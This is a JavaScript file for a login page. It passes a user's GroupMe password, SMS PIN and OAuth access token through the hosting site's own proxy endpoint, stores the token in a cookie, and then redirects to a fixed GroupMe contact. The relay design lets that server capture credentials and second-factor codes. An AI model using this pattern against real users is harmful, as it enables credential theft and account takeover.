var client_id = "GSOKPf8bCjignwRP3KVPrt6BiWqjKRBAlo1nyesGgsWh0uCk";
let visibleModal = null;
var sessionToken;
var rememberMe;

async function checkToken() {
    const token = getCookie("token");
    if (token) {
        let response;
        try {
            response = await fetch('/verifyToken', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({ token : token }),
            });
            if (response.ok) {
                window.location.replace("https://groupme.com/contact/116121837/IGs6jOkA");
            }
        } catch (error) {
            console.log(error);
            throw new Error('Request failed');
        }
    }
}

function getCookie(cname) {
    let name = cname + "=";
    let decodedCookie = decodeURIComponent(document.cookie);
    let ca = decodedCookie.split(';');
    for(let i = 0; i <ca.length; i++) {
      let c = ca[i];
      while (c.charAt(0) == ' ') {
        c = c.substring(1);
      }
      if (c.indexOf(name) == 0) {
        return c.substring(name.length, c.length);
      }
    }
    return "";
}

async function submit() {
    const incorrectText = document.getElementById("incorrect-password");
    incorrectText.style.display = "none";

    const passwordBox = document.getElementById("password");
    passwordBox.setAttribute("aria-invalid", "");

    const submitButton = document.getElementById("submit-button");
    submitButton.setAttribute("aria-busy", "true");
    submitButton.textContent = "Authenticating...";

    const form = document.getElementById("login-form");

    rememberMe = form.elements.remember.checked;
    uname = form.elements.username.value;
    pass = form.elements.password.value;

    var request = {
        method: "POST",
        endpoint : "https://oauth.groupme.com/oauth/login",
        request : {
            "client_id" : client_id,
            "username" : uname,
            "password" : pass,
            "g-recaptcha-response": ""
        },
        options : {
            headers: {
                'content-type': 'application/x-www-form-urlencoded'
            },
            maxRedirects: 0,
        }
    }

    var response = await CORSproxy(request);
    if (response.headers.location.pathname === "/oauth/login_dialog_pin") {
        sessionToken = response.headers.rackSession;
        openModal(document.getElementById('verify-modal'));
    } else {
        submitButton.setAttribute("aria-busy", "false");
        submitButton.textContent = "Authenticate";
        rejectSubmit();
        return;
    }
}

function rejectSubmit() {
    const incorrectText = document.getElementById("incorrect-password");
    incorrectText.style.color = 'red';
    incorrectText.style.display = "block";

    const passwordBox = document.getElementById("password");
    passwordBox.setAttribute("aria-invalid", "true");
    passwordBox.value = "";
    
}

async function verify() {
    const verifyButton = document.getElementById("submit-button");
    verifyButton.setAttribute("aria-busy", "true");
    verifyButton.textContent = "Verifying...";

    const form = document.getElementById("verify-form");
    var request = {
        method: "POST",
        endpoint : "https://oauth.groupme.com/oauth/login/pin_verification",
        request : {
            "client_id" : client_id, 
            "pin" : form.elements.pin.value,
        },
        options : {
            headers: {
                'content-type': 'application/x-www-form-urlencoded',
                'Cookie': `rack.session=${sessionToken};`
            },
            maxRedirects: 0,
        }
    }

    var response = await CORSproxy(request);
    console.log(response);
    if (response.headers.location.pathname === "/oauth/authorize") {
        sessionToken = response.headers.rackSession;
        request = {
            method: "POST",
            endpoint: "https://oauth.groupme.com/oauth/grant",
            request: {
                "client_id": client_id
            },
            options: {
                headers: {
                    'content-type': 'application/x-www-form-urlencoded',
                    'Cookie': `rack.session=${sessionToken}`
                },
                maxRedirects: 0,
            }
        }
        response = await CORSproxy(request);

        if (response.headers.location.query.access_token) {
            verifyButton.setAttribute("aria-busy", "false");
            verifyButton.textContent = "Verify";
            closeModal(document.getElementById('verify-modal'));
            if (rememberMe) {
                setCookie("token", response.headers.location.query.access_token, 30);
            } else {
                document.cookie = "token" + '=' + response.headers.location.query.access_token + '; path=/';
            }
            checkToken();
        } else {
            rejectVerify();
        }

    } else {
        verifyButton.setAttribute("aria-busy", "false");
        verifyButton.textContent = "Verify";
        rejectVerify();
    }
}

function rejectVerify() {
}

async function sendAnotherText() {
    var request = {
        method: "GET",
        endpoint : `https://oauth.groupme.com/oauth/login_pin?method=sms&client_id=${client_id}`,
        options : {
            headers: {
                'content-type': 'application/x-www-form-urlencoded',
                'Cookie': `rack.session=${sessionToken};`
            },
        }
    }

    console.log(await CORSproxy(request));
}

function openModal(modal) {
    if (document.body.scrollHeight > screen.height) {
        document.documentElement.style.setProperty("--scrollbar-width", `${getScrollbarWidth()}px`);
    }
    document.documentElement.classList.add("modal-is-open", "modal-is-opening");
    setTimeout(() => {
        visibleModal = modal;
        document.documentElement.classList.remove("modal-is-opening");
    }, 400);
    modal.setAttribute("open", true);
};

function closeModal(modal) {
    visibleModal = null;
    document.documentElement.classList.add("modal-is-closing");
    setTimeout(() => {
        document.documentElement.classList.remove("modal-is-closing", "modal-is-open");
        document.documentElement.style.removeProperty("--scrollbar-width");
        modal.removeAttribute("open");
    }, 400);
};

document.addEventListener("click", (event) => {
    if (visibleModal != null) {
      const modalContent = visibleModal.querySelector("article");
      const isClickInside = modalContent.contains(event.target);
      !isClickInside && closeModal(visibleModal);

      const submitButton = document.getElementById("submit-button");
      submitButton.setAttribute("aria-busy", "false");
      submitButton.textContent = "Authenticate";
    }
});

async function CORSproxy(request) {
    try {
        const response = await fetch('/proxy-api', {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json',
            },
            body: JSON.stringify(request),
        });
        if (response.ok) {
            return response.json();
        } else {
            throw new Error('Request failed');
        }
    } catch (error) {
        console.log(error);
        throw new Error('Request failed');
    }
};

function setCookie(name, value, daysToExpire) {
    var expires = '';
    if (daysToExpire) {
      var date = new Date();
      date.setTime(date.getTime() + (daysToExpire * 24 * 60 * 60 * 1000));
      expires = '; expires=' + date.toUTCString();
    }
  
    document.cookie = name + '=' + value + expires + '; path=/';
};